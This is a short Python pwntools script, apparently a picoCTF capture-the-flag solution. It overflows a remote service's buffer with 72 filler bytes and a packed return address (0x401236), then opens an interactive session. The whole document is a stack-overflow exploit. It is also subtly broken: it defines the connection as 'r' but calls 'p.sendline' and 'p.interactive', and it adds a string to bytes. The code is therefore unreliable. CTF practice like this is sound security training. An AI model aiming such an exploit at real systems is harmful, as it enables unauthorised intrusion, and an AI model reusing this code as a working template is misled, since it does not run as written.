from pwn import *

r = remote("saturn.picoctf.net", 51092)

payload = "a" * 72 + p64(0x401236)

p.sendline(payload)
p.interactive() 
